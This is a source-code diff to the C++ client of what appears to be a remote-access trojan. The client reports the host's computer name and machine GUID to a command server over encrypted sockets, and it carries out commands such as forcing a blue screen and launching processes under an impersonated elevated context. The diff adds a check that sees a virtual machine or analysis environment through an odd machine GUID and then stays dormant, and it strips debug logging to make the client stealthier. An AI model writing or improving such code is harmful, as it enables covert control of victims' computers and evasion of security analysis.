@@ -31,7 +31,6 @@ Client::~Client() {
     this->Disconnect(false); // disconnect incase the socket is still connected
 
     CleanWSA();
-    //m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
 }
 
 void Client::SetRemoteComputerName() {
@@ -40,16 +39,18 @@ void Client::SetRemoteComputerName() {
 
     // get computer name
     BOOL success = GetComputerNameA(buffer, &buffSize);
-    if ( success ) {
+    if ( success )
         this->m_ComputerName = buffer;
-    }
 }
 
 bool Client::Connect() {
+    if ( this->m_MachineGUID == ":(" ) 
+        return false; // vm or some controlled environment
+
     // make request to udp server
     this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if ( this->m_UDPSocket == INVALID_SOCKET )
-        return FALSE;
+        return false;
 
     // set timeout for sending and receiving on udp socket
     // if it times out that means server is not on
@@ -88,7 +89,6 @@ bool Client::Connect() {
 
     if ( !ExchangePublicKeys() || !SendComputerNameToServer() || !SendMachineGUIDToServer() )
         return false;
-    
    
     return true;
 }
@@ -132,6 +132,12 @@ void Client::SetRemoteMachineGUID() {
     PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
     std::wstring data = ( wchar_t* ) pk->Data;
     std::string string = std::string(data.begin(), data.end());
+
+    if ( string.length() != 36 ) {
+        this->m_MachineGUID = ":(";
+        return;
+    }
+
     this->m_MachineGUID = string;
 }
 
@@ -203,13 +209,8 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
         this->m_ProcMgr.BSOD();
         break;
     case RemoteAction::kOpenRemoteProcess:
-        CLIENT_DBG("opening elevated process");
-
         STARTUPINFO         si = {};
         PROCESS_INFORMATION pi = {};
-
-        CLIENT_DBG(std::string(description.application.begin(), description.application.end()).c_str());
-        CLIENT_DBG(std::string(description.commandArgs.begin(), description.commandArgs.end()).c_str());
 
         success = this->m_ProcMgr.OpenProcessAsImposter(
             description.creationContext,
@@ -222,9 +223,6 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
             &si,
             &pi
         );
-
-        if ( success == TRUE )
-            CLIENT_DBG("opened...");
 
         break;
     }
@@ -266,20 +264,16 @@ void Client::ListenForServerCommands() {
             TCP
         );
 
-        CLIENT_DBG("got packet!");
-
         Packet receivedPacket = OnEncryptedPacket(encrypted);
         ClientResponse responseToServer;
         
         if ( receivedPacket.action == kKeepAlive ) {
             // echo keep alive
-            CLIENT_DBG("echo keep alive!");
             m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
             continue;
         }
 
         if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
-            CLIENT_DBG("IS cmd");
             PerformCommand(receivedPacket, responseToServer);
         }
 
@@ -356,7 +350,6 @@ bool Client::ExchangePublicKeys() {
 }
 
 bool Client::SendMessageToServer(std::string message, BOOL encrypted) {    
-    CLIENT_DBG(message.c_str());
 
     BYTESTRING serialized = Serialization::SerializeString(message);
     bool       success    = false;
